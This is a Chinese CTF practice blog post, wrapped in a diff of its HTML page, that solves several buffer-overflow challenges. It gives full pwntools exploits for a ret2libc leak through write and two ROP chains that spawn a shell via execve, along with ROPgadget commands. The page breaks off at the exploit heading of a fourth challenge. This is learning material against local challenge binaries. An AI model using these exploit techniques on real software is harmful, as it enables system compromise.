@@ -1,0 +1,728 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>PWN题练一下 | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="LEVEL3首先检查一下保护                                                                                                             在 IDA 里面发现了 vulnerable_function read 函数存在溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PWN题练一下">
+<meta property="og:url" content="https://yichen115.github.io/2019/11/10/vpgk9n/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="LEVEL3首先检查一下保护                                                                                                             在 IDA 里面发现了 vulnerable_function read 函数存在溢出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813789-ab0d1052-20be-4c90-81eb-23ca19e3458b.png#align=left&display=inline&height=213&originHeight=213&originWidth=730&size=0&status=done&style=none&width=730">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813876-a0826a31-b0b4-4913-92c0-a031006a696f.png#align=left&display=inline&height=170&originHeight=170&originWidth=341&size=0&status=done&style=none&width=341">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813720-1450a8a2-179d-4e49-97c7-d5b5e11e08f0.png#align=left&display=inline&height=416&originHeight=416&originWidth=1200&size=0&status=done&style=none&width=1200">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813888-40a886b0-071c-4e5c-999a-359594db60bf.png#align=left&display=inline&height=117&originHeight=117&originWidth=524&size=0&status=done&style=none&width=524">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813738-f9be254f-940d-411d-a512-70492a555162.png#align=left&display=inline&height=312&originHeight=312&originWidth=600&size=0&status=done&style=none&width=600">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135997-c9ab110a-c12e-438d-8bea-99fc3d76b34f.png#align=left&display=inline&height=217&originHeight=217&originWidth=726&size=0&status=done&style=none&width=726">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135772-96ea58bd-bd0e-4c06-a41c-dc80ea173127.png#align=left&display=inline&height=193&originHeight=193&originWidth=676&size=0&status=done&style=none&width=676">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135862-6a952c96-07a7-482c-af66-eb93c32406fe.png#align=left&display=inline&height=315&originHeight=315&originWidth=691&size=0&status=done&style=none&width=691">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135787-742338cd-f1f4-428e-b9f9-f6d48571295c.png#align=left&display=inline&height=371&originHeight=371&originWidth=1200&size=0&status=done&style=none&width=1200">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135788-7a81f21a-85e7-4d3e-9c89-3629af61380c.png#align=left&display=inline&height=130&originHeight=130&originWidth=725&size=0&status=done&style=none&width=725">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135766-ff2d2817-fa72-4e8b-aba9-328f27839ee3.png#align=left&display=inline&height=583&originHeight=583&originWidth=782&size=0&status=done&style=none&width=782">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135864-3ec39936-170d-4966-9571-ad903986d560.png#align=left&display=inline&height=79&originHeight=79&originWidth=664&size=0&status=done&style=none&width=664">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135796-5c2c8f9c-1948-4f61-bf20-bcfdfefa50ab.png#align=left&display=inline&height=204&originHeight=204&originWidth=800&size=0&status=done&style=none&width=800">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135780-2937d8ce-0baa-47b7-bf94-fa2281bba678.png#align=left&display=inline&height=181&originHeight=181&originWidth=607&size=0&status=done&style=none&width=607">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767774-a4f3e96d-8197-4c18-814f-90f92879a9db.png#align=left&display=inline&height=215&originHeight=215&originWidth=727&size=0&status=done&style=none&width=727">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767697-84385e41-12cf-4f7d-9a62-3799e648508c.png#align=left&display=inline&height=218&originHeight=218&originWidth=611&size=0&status=done&style=none&width=611">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767830-2e0ea3db-0e68-41c5-922a-b3ee486dcb6d.png#align=left&display=inline&height=287&originHeight=287&originWidth=1064&size=0&status=done&style=none&width=1064">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781367-21ee5c35-56d9-464d-9653-5ff7c948fde8.png#align=left&display=inline&height=239&originHeight=239&originWidth=728&size=0&status=done&style=none&width=728">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781381-fa739aeb-127e-4129-a2a6-401d0a689475.png#align=left&display=inline&height=196&originHeight=196&originWidth=476&size=0&status=done&style=none&width=476">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781411-f4ca8704-a39c-4450-a1b9-2897e14e9371.png#align=left&display=inline&height=320&originHeight=320&originWidth=884&size=0&status=done&style=none&width=884">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781330-9829c0db-c846-42bb-8b49-7e1adcf69902.png#align=left&display=inline&height=283&originHeight=283&originWidth=1040&size=0&status=done&style=none&width=1040">
+<meta property="article:published_time" content="2019-11-10T05:41:56.000Z">
+<meta property="article:modified_time" content="2020-08-03T02:52:13.518Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813789-ab0d1052-20be-4c90-81eb-23ca19e3458b.png#align=left&display=inline&height=213&originHeight=213&originWidth=730&size=0&status=done&style=none&width=730">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">PWN题练一下</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">PWN题练一下</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-10T05:41:56.000Z" itemprop="datePublished" class="page-time">
+  2019-11-10
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#LEVEL3"><span class="post-toc-number">1.</span> <span class="post-toc-text">LEVEL3</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#PWN5"><span class="post-toc-number">2.</span> <span class="post-toc-text">PWN5</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#simplerop"><span class="post-toc-number">3.</span> <span class="post-toc-text">simplerop</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#低级魔法"><span class="post-toc-number">4.</span> <span class="post-toc-text">低级魔法</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#高级魔法"><span class="post-toc-number">5.</span> <span class="post-toc-text">高级魔法</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-vpgk9n"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">PWN题练一下</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-10 13:41:56" datetime="2019-11-10T05:41:56.000Z"  itemprop="datePublished">2019-11-10</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="LEVEL3"><a href="#LEVEL3" class="headerlink" title="LEVEL3"></a>LEVEL3</h1><p>首先检查一下保护</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813789-ab0d1052-20be-4c90-81eb-23ca19e3458b.png#align=left&display=inline&height=213&originHeight=213&originWidth=730&size=0&status=done&style=none&width=730" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 IDA 里面发现了 vulnerable_function read 函数存在溢出</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813876-a0826a31-b0b4-4913-92c0-a031006a696f.png#align=left&display=inline&height=170&originHeight=170&originWidth=341&size=0&status=done&style=none&width=341" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>计算溢出</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813720-1450a8a2-179d-4e49-97c7-d5b5e11e08f0.png#align=left&display=inline&height=416&originHeight=416&originWidth=1200&size=0&status=done&style=none&width=1200" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>可以看到溢出长度是 140</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813888-40a886b0-071c-4e5c-999a-359594db60bf.png#align=left&display=inline&height=117&originHeight=117&originWidth=524&size=0&status=done&style=none&width=524" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>但同时我们 IDA 里没有发现 /bin/sh  等字符串</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563605813738-f9be254f-940d-411d-a512-70492a555162.png#align=left&display=inline&height=312&originHeight=312&originWidth=600&size=0&status=done&style=none&width=600" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>但是我们看到了 write，可以通过 write  泄漏 libc，来使用 libc  中的 system 和 /bin/sh</p>
+<p>首先通过 write  得到 write  函数的地址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./level3'</span>)</span><br><span class="line">write_plt=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got=elf.got[<span class="string">'write'</span>]</span><br><span class="line">main_addr=elf.symbols[<span class="string">'main'</span>]</span><br><span class="line">payload1=<span class="string">'A'</span>*<span class="number">140</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">0x1</span>)+p32(write_got)+p32(<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#write 函数原型是 write(1,address,len) ，1表示标准输出流 ，address 是 write 函数要输出信息的地址 ，而 len 表示输出长度</span></span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#通过 LibcSeacher 获得 libc 版本</span></span><br><span class="line">libc=LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line"><span class="comment">#计算 libc 的地址</span></span><br><span class="line">libcbase=write_addr-libc.dump(<span class="string">"write"</span>)</span><br><span class="line"><span class="comment">#计算 system 地址</span></span><br><span class="line">system_addr=libcbase+libc.dump(<span class="string">"system"</span>)</span><br><span class="line"><span class="comment">#计算 /bin/sh 地址</span></span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">140</span>+p32(system_addr)+p32(<span class="number">0xbeadbeef</span>)+p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="PWN5"><a href="#PWN5" class="headerlink" title="PWN5"></a>PWN5</h1><p>检查一下保护</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135997-c9ab110a-c12e-438d-8bea-99fc3d76b34f.png#align=left&display=inline&height=217&originHeight=217&originWidth=726&size=0&status=done&style=none&width=726" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>IDA 查看也没找到 system  与 /bin/sh<br>找到会发生溢出的地方</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135772-96ea58bd-bd0e-4c06-a41c-dc80ea173127.png#align=left&display=inline&height=193&originHeight=193&originWidth=676&size=0&status=done&style=none&width=676" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>计算一下溢出，当选择 2 的时候能到我们找到的产生溢出的地方</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135862-6a952c96-07a7-482c-af66-eb93c32406fe.png#align=left&display=inline&height=315&originHeight=315&originWidth=691&size=0&status=done&style=none&width=691" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135787-742338cd-f1f4-428e-b9f9-f6d48571295c.png#align=left&display=inline&height=371&originHeight=371&originWidth=1200&size=0&status=done&style=none&width=1200" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>IDA 查看也没找到 system  与 /bin/sh<br>这次我们构造 execve(“/bin/sh”,NULL,NULL)  直接弹出 shell</p>
+<p>只要把对应获取 shell  的系统调用的参数放到对应的寄存器中，那么我们执行  int 0x80  就可以执行对应的系统调用</p>
+<p>使用以下命令来寻找控制 eax  的 gadgets<br>ROPgadget –binary pwn5 –only ‘pop|ret’ | grep ‘eax’</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135788-7a81f21a-85e7-4d3e-9c89-3629af61380c.png#align=left&display=inline&height=130&originHeight=130&originWidth=725&size=0&status=done&style=none&width=725" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>选第三个，0x080bc396</p>
+<p>使用以下命令来寻找控制 ebx 的 gadgets<br>ROPgadget –binary pwn5 –only ‘pop|ret’ | grep ‘ebx’</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135766-ff2d2817-fa72-4e8b-aba9-328f27839ee3.png#align=left&display=inline&height=583&originHeight=583&originWidth=782&size=0&status=done&style=none&width=782" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>选择  0x080733b0</p>
+<p>查找 /bin/sh  的字符串：<br>ROPgadget –binary pwn5 –string ‘/bin/sh’</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135864-3ec39936-170d-4966-9571-ad903986d560.png#align=left&display=inline&height=79&originHeight=79&originWidth=664&size=0&status=done&style=none&width=664" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>并没有找到，但是我们可以在程序要求写入的时候写进去，这里我们选择在  first_name  缓冲区写入：0x080F1A20</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135796-5c2c8f9c-1948-4f61-bf20-bcfdfefa50ab.png#align=left&display=inline&height=204&originHeight=204&originWidth=800&size=0&status=done&style=none&width=800" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>查找 int 80  的地址:0x08071005<br>ROPgadget –binary pwn5 –only ‘int’</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563616135780-2937d8ce-0baa-47b7-bf94-fa2281bba678.png#align=left&display=inline&height=181&originHeight=181&originWidth=607&size=0&status=done&style=none&width=607" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>exp 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./pwn5'</span>)</span><br><span class="line">pop_eax_addr = <span class="number">0x080bc396</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x080733b0</span></span><br><span class="line">int_0x80_addr = <span class="number">0x08071005</span></span><br><span class="line">bin_sh_addr = <span class="number">0x080F1A20</span></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">32</span></span><br><span class="line">payload += p32(pop_eax_addr)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_edx_ecx_ebx_addr)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(bin_sh_addr)</span><br><span class="line">payload += p32(int_0x80_addr)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh"</span>)</span><br><span class="line">p.sendline(<span class="string">"yichen"</span>)</span><br><span class="line">p.sendline(<span class="string">"pwn"</span>)</span><br><span class="line">p.sendline(<span class="string">"y"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="simplerop"><a href="#simplerop" class="headerlink" title="simplerop"></a>simplerop</h1><p>检查一下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767774-a4f3e96d-8197-4c18-814f-90f92879a9db.png#align=left&display=inline&height=215&originHeight=215&originWidth=727&size=0&status=done&style=none&width=727" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 IDA  里面发现  read  造成溢出漏洞</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767697-84385e41-12cf-4f7d-9a62-3799e648508c.png#align=left&display=inline&height=218&originHeight=218&originWidth=611&size=0&status=done&style=none&width=611" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>测试一下溢出长度：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949767830-2e0ea3db-0e68-41c5-922a-b3ee486dcb6d.png#align=left&display=inline&height=287&originHeight=287&originWidth=1064&size=0&status=done&style=none&width=1064" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>所以我们的思路是：32 个垃圾数据 + execve(“/bin/sh”, 0, 0)<br>注意：<br>没有 system 需要构造 execve 没有 /bin/sh 得自己写入，写入的话 32 位 最多 一次写 4bit 所以得分两次写</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./simplerop'</span>)</span><br><span class="line">int_0x80 = <span class="number">0x080493e1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080bae06</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806e850</span></span><br><span class="line">data_addr = <span class="number">0x080ea060</span></span><br><span class="line">mov__edx__eax_ret = <span class="number">0x0809a15d</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806e82a</span></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">32</span></span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(data_addr)<span class="comment">#用 edx 存放 data_addr</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += <span class="string">"/bin"</span> <span class="comment">#用 eax 存放 /bin</span></span><br><span class="line">payload += p32(mov__edx__eax_ret)<span class="comment">#把 eax 的内容（/bin）移动到 edx（这里是个地址）处也就是说 edx_addr(.data_addr) 存放/bin 也就是 在data段内写入/bin</span></span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(data_addr + <span class="number">0x4</span>)<span class="comment">#用 edx 存放 data_addr + 0x4</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += <span class="string">"/sh\x00"</span> <span class="comment">#用 eax 存放 /sh\x00 （截断）</span></span><br><span class="line">payload += p32(mov__edx__eax_ret)<span class="comment">#把 eax 的内容（/sh\x00）移动到 edx 处 也就是说 edx_addr （.data_addr + 0x4）存放 /sh\x00 也就是(data + 0x4)也在data段写入/sh\x00</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += p32(<span class="number">0xb</span>) <span class="comment">#用 eax 存放 0xb(execve 的系统调用号)</span></span><br><span class="line">payload += p32(pop_edx_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(data_addr) <span class="comment">#传入参数 execve("/bin/sh", 0, 0)（./data_addr存放 了"/bin/sh"）</span></span><br><span class="line">payload += p32(int_0x80) <span class="comment">#截断</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="低级魔法"><a href="#低级魔法" class="headerlink" title="低级魔法"></a>低级魔法</h1><p>检查一下：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781367-21ee5c35-56d9-464d-9653-5ff7c948fde8.png#align=left&display=inline&height=239&originHeight=239&originWidth=728&size=0&status=done&style=none&width=728" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>当选择 4  的时候发现溢出</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781381-fa739aeb-127e-4129-a2a6-401d0a689475.png#align=left&display=inline&height=196&originHeight=196&originWidth=476&size=0&status=done&style=none&width=476" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>在 IDA  中看到 cat flag</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781411-f4ca8704-a39c-4450-a1b9-2897e14e9371.png#align=left&display=inline&height=320&originHeight=320&originWidth=884&size=0&status=done&style=none&width=884" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>看一下溢出点</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2019/png/268938/1563949781330-9829c0db-c846-42bb-8b49-7e1adcf69902.png#align=left&display=inline&height=283&originHeight=283&originWidth=1040&size=0&status=done&style=none&width=1040" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>exp：</p>
